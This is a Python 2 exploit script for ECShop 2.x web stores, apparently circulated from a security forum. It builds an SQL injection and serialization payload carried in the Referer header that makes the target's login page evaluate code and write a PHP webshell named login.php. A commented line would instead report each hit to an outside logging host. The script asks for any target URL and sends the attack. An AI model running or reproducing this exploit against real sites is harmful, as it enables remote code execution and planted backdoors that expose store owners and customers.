#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-09-02 17:57:57
# @Link    : [url]http://www.baidu.com/[/url]
# @Version : python2.7

import os,sys,base64,requests
from urlparse import urlparse
if sys.getdefaultencoding() != 'utf-8':
    reload(sys)
    sys.setdefaultencoding('utf-8')

def get_data(url,header):
    Flag = False
    timeouts = 0
    while True:
        try:
            timeouts = timeouts + 1
            res = requests.get(url, headers=header, timeout=10)
            if res.status_code == 200:
                Flag = True
        except Exception as e:
            import time
            print "Error:%s Info:%s" % (timeouts, e.message)
            time.sleep(1)
        finally:
            if Flag:
                return res.text

#php_souce = """file_get_contents("http://www.mysite.com/log.php?id=zzz");"""  # 批量记录
php_souce = """file_put_contents('login.php','<?php $a = $_REQUEST[a];$b = null;eval($b.$a);?>');""" #写入webshell
php_souce_b64 = base64.b64encode(php_souce)
poc_tmp = "{$asd'];assert(base64_decode('%s'));//}xxx" % (php_souce_b64)
poc_hex = "0x" + "".join("{:02x}".format(ord(c)) for c in poc_tmp)
poc = '*/ union select 1,0x272f2a,3,4,5,6,7,8,%s,10-- -'
poc = poc % (poc_hex)

poc_length = len(poc)
poc_referer_tmp = """554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:%s:"%s";s:2:"id";s:3:"'/*";}"""
poc_referer = poc_referer_tmp %(poc_length,poc)
cookie ="cna=SaH/EykaFQgCARsa38y08Q8W; isg=BAwM23sIu9Ug6a-pVLWi-TUv3Wr-7bCIHUZ6sGbNGLda8az7j1WAfwJAlbnsuehH; ECS[visit_times]=1; ECS_ID=36cdc0c50b505b1a53ae1934efbcafcf358aba89"

headers = {
    'UserAgent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3',
    'Referer': poc_referer,
    'Cookie': cookie
}

if __name__ == '__main__':
        print """ecshop2.x poc (form [url]www.t00ls.net[/url]) 
reference  --> [url]https://xz.aliyun.com/t/2689[/url] 
reference  --> [url]http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/[/url]
"""
        val_url = ''
        while True:
            input_url = raw_input("[*] please input url (eg: [url]http://www.ecshop.com/[/url]):" + os.linesep);
            scheme, netloc, path, params, query, fragment = urlparse(input_url)
            if scheme in ["http","https"]:
                val_url = scheme + '://' + netloc +'/user.php?act=login'
                break
            else:
                print "start with http:// or https://"


        if (val_url):
            print get_data(val_url,headers)